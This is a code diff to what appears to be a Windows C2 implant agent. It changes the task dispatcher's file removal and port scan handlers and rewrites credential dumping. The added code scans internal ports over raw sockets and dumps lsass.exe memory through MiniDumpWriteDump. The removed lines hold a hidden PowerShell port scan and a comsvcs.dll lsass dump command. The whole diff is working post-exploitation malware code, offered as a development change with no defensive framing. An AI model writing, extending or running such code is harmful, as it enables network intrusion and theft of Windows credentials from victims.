@@ -4,6 +4,8 @@
 #include "config.h"
 #include "evasion.h"
 #include "b64.h"
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <windows.h>
 #include <tlhelp32.h>
 #include <stdlib.h>
@@ -258,7 +260,25 @@ static void json_get_str(const char *json, const char *key, char *out, size_t ou
     if (!p) { strncpy(out, def, out_sz-1); out[out_sz-1]='\0'; return; }
     p++;
     size_t i = 0;
-    while (*p && *p != '"' && i < out_sz-1) out[i++] = *p++;
+    while (*p && *p != '"' && i < out_sz-1) {
+        if (*p == '\\' && *(p+1)) {
+            p++;
+            if      (*p == '\\') out[i++] = '\\';
+            else if (*p == '"')  out[i++] = '"';
+            else if (*p == '/')  out[i++] = '/';
+            else if (*p == 'n')  out[i++] = '\n';
+            else if (*p == 'r')  out[i++] = '\r';
+            else if (*p == 't')  out[i++] = '\t';
+            else if (*p == 'u' && i < out_sz-2) {
+                /* \uXXXX — handle BMP ASCII range only */
+                char hex[5]={0}; int valid=1;
+                for (int h=0;h<4;h++) { if (!*(p+1+h)) {valid=0;break;} hex[h]=*(p+1+h); }
+                if (valid) { int cp=(int)strtol(hex,NULL,16); p+=4; if(cp>0&&cp<128) out[i++]=(char)cp; }
+                else out[i++] = '?';
+            } else out[i++] = *p;
+        } else out[i++] = *p;
+        p++;
+    }
     out[i] = '\0';
 }
 
@@ -598,14 +618,20 @@ void dispatch_task(AgentTask *task) {
     else if (strcmp(type_upper, "RM") == 0) {
         DWORD attr = GetFileAttributesA(args);
         int r;
-        if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY))
-            r = RemoveDirectoryA(args);
-        else
+        if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
+            char cmd_rm[MAX_PATH + 32];
+            snprintf(cmd_rm, sizeof(cmd_rm), "rmdir /s /q \"%s\" 2>&1", args);
+            char *out = run_shell(cmd_rm);
+            r = (out && out[0] == '\0') ? 1 : 0;
+            if (r) { free(out); agent_send_result(task->id, "[+] removed", ""); }
+            else { agent_send_result(task->id, out ? out : "", ""); if(out) free(out); }
+        } else {
             r = DeleteFileA(args);
-        if (r) agent_send_result(task->id, "[+] removed", "");
-        else {
-            char err[64]; snprintf(err, sizeof(err), "rm: error %lu", GetLastError());
-            agent_send_result(task->id, "", err);
+            if (r) agent_send_result(task->id, "[+] removed", "");
+            else {
+                char err[64]; snprintf(err, sizeof(err), "rm: error %lu", GetLastError());
+                agent_send_result(task->id, "", err);
+            }
         }
     }
     else if (strcmp(type_upper, "UPLOAD") == 0) {
@@ -802,33 +828,116 @@ void dispatch_task(AgentTask *task) {
         char *out = run_shell(cmd2); agent_send_result(task->id, out, ""); free(out);
     }
     else if (strcmp(type_upper, "PORT_SCAN") == 0) {
-        char host[128]={0}, ports[256]={0};
+        char host[128]={0}, ports_arg[512]={0};
         json_get_str(args,"host",host,sizeof(host),"127.0.0.1");
-        json_get_str(args,"ports",ports,sizeof(ports),"80,443,445,3389,22,21,8080");
-        int timeout = json_get_int(args,"timeout",500);
-        char ps[1024];
-        snprintf(ps,sizeof(ps),
-            "powershell.exe -NoP -NonI -W Hidden -C \"$h='%s';$t=%d;"
-            "'%s'.Split(',') | ForEach-Object { $p=[int]$_;"
-            "$s=New-Object System.Net.Sockets.TcpClient;"
-            "$a=$s.BeginConnect($h,$p,$null,$null);"
-            "if($a.AsyncWaitHandle.WaitOne($t)){if($s.Connected){'OPEN '+$h+':'+$p};$s.Close()} }\"",
-            host, timeout, ports);
-        char *out = run_shell(ps); agent_send_result(task->id, out, ""); free(out);
+        json_get_str(args,"ports",ports_arg,sizeof(ports_arg),"80,443,445,3389,22,21,8080");
+        int timeout_ms = json_get_int(args,"timeout",500);
+
+        /* Resolve host once */
+        struct in_addr resolved = {0};
+        resolved.s_addr = inet_addr(host);
+        if (resolved.s_addr == INADDR_NONE) {
+            struct hostent *he = gethostbyname(host);
+            if (he) memcpy(&resolved, he->h_addr, 4);
+        }
+
+        size_t out_cap = 4096, out_len = 0;
+        char *out_buf = (char*)malloc(out_cap);
+        if (!out_buf) { agent_send_result(task->id,"","oom"); goto ps_done; }
+        out_buf[0] = '\0';
+
+        char ports_copy[512];
+        strncpy(ports_copy, ports_arg, sizeof(ports_copy)-1);
+        char *tok = strtok(ports_copy, ",");
+        while (tok) {
+            int port = atoi(tok);
+            tok = strtok(NULL, ",");
+            if (port <= 0 || port > 65535) continue;
+
+            SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+            if (s == INVALID_SOCKET) continue;
+
+            /* Non-blocking connect with select timeout */
+            u_long nb = 1; ioctlsocket(s, FIONBIO, &nb);
+            struct sockaddr_in sa = {0};
+            sa.sin_family = AF_INET;
+            sa.sin_port   = htons((u_short)port);
+            sa.sin_addr   = resolved;
+            connect(s, (struct sockaddr*)&sa, sizeof(sa));
+
+            fd_set wfds; FD_ZERO(&wfds); FD_SET(s, &wfds);
+            struct timeval tv = {timeout_ms/1000, (timeout_ms%1000)*1000};
+            if (select(0, NULL, &wfds, NULL, &tv) > 0) {
+                int err=0; int el=sizeof(err);
+                getsockopt(s, SOL_SOCKET, SO_ERROR, (char*)&err, &el);
+                if (err == 0) {
+                    char line[128];
+                    int ll = snprintf(line,sizeof(line),"OPEN %s:%d\n",host,port);
+                    if (out_len + (size_t)ll + 2 >= out_cap) {
+                        out_cap += 4096;
+                        char *nb2=(char*)realloc(out_buf,out_cap);
+                        if(nb2) out_buf=nb2;
+                    }
+                    memcpy(out_buf+out_len, line, (size_t)ll);
+                    out_len += (size_t)ll;
+                    out_buf[out_len] = '\0';
+                }
+            }
+            closesocket(s);
+        }
+        if (out_len == 0) strcpy(out_buf, "[no open ports found]");
+        agent_send_result(task->id, out_buf, "");
+        free(out_buf);
+        ps_done:;
     }
     else if (strcmp(type_upper, "MINIDUMP") == 0) {
         char path[MAX_PATH]={0};
         json_get_str(args,"path",path,sizeof(path),"C:\\Windows\\Temp\\1.dmp");
-        char ps[512];
-        snprintf(ps,sizeof(ps),
-            "powershell.exe -NoP -NonI -C \"$p=(Get-Process lsass).Id;"
-            "rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump $p '%s' full\"",
-            path);
-        char *out = run_shell(ps);
-        if (!out || !out[0]) {
-            free(out); char m[256]; snprintf(m,sizeof(m),"[+] dump written to %s",path);
-            agent_send_result(task->id, m, "");
-        } else { agent_send_result(task->id, out, ""); free(out); }
+
+        /* Find lsass.exe PID via snapshot (no OpenProcess needed yet) */
+        DWORD lsass_pid = 0;
+        HANDLE snap2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (snap2 != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32 pe2; pe2.dwSize = sizeof(pe2);
+            if (Process32First(snap2, &pe2)) {
+                do {
+                    if (_stricmp(pe2.szExeFile, "lsass.exe") == 0) { lsass_pid = pe2.th32ProcessID; break; }
+                } while (Process32Next(snap2, &pe2));
+            }
+            CloseHandle(snap2);
+        }
+        if (!lsass_pid) { agent_send_result(task->id, "", "lsass not found"); }
+        else {
+            HANDLE hLsa = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsass_pid);
+            if (!hLsa) { char e[64]; snprintf(e,sizeof(e),"OpenProcess lsass %lu",GetLastError()); agent_send_result(task->id,"",e); }
+            else {
+                HANDLE hF = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                if (hF == INVALID_HANDLE_VALUE) {
+                    CloseHandle(hLsa);
+                    char e[64]; snprintf(e,sizeof(e),"CreateFile %lu",GetLastError()); agent_send_result(task->id,"",e);
+                } else {
+                    typedef BOOL (WINAPI *pfnMWD)(HANDLE,DWORD,HANDLE,DWORD,void*,void*,void*);
+                    HMODULE hDbg = LoadLibraryA("dbghelp.dll");
+                    pfnMWD miniDump = hDbg ? (pfnMWD)GetProcAddress(hDbg,"MiniDumpWriteDump") : NULL;
+                    if (!miniDump) {
+                        CloseHandle(hF); CloseHandle(hLsa);
+                        if (hDbg) FreeLibrary(hDbg);
+                        agent_send_result(task->id,"","dbghelp MiniDumpWriteDump unavailable");
+                    } else {
+                        /* MiniDumpWithFullMemory = 2 */
+                        BOOL ok = miniDump(hLsa, lsass_pid, hF, 2, NULL, NULL, NULL);
+                        CloseHandle(hF); CloseHandle(hLsa); FreeLibrary(hDbg);
+                        if (ok) {
+                            char m[256]; snprintf(m,sizeof(m),"[+] dump written to %s",path);
+                            agent_send_result(task->id, m, "");
+                        } else {
+                            char e[64]; snprintf(e,sizeof(e),"MiniDumpWriteDump failed %lu",GetLastError());
+                            agent_send_result(task->id,"",e);
+                        }
+                    }
+                }
+            }
+        }
     }
     else if (strcmp(type_upper, "ENV") == 0) {
         char *out = run_shell("set 2>&1"); agent_send_result(task->id, out, ""); free(out);
